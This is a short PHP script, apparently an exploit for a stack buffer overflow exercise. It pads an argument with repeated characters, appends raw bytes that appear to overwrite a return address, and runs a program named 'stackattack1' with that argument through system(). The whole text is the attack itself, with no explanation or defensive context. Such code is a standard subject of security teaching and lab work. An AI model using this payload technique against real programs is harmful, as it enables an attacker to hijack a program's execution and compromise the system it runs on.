$hex = 'f8';

$arg = "ssssssssssssss".$hex."\x11\x40\x00\x01";
$cmd = "stackattack1 ".$arg;

system($cmd);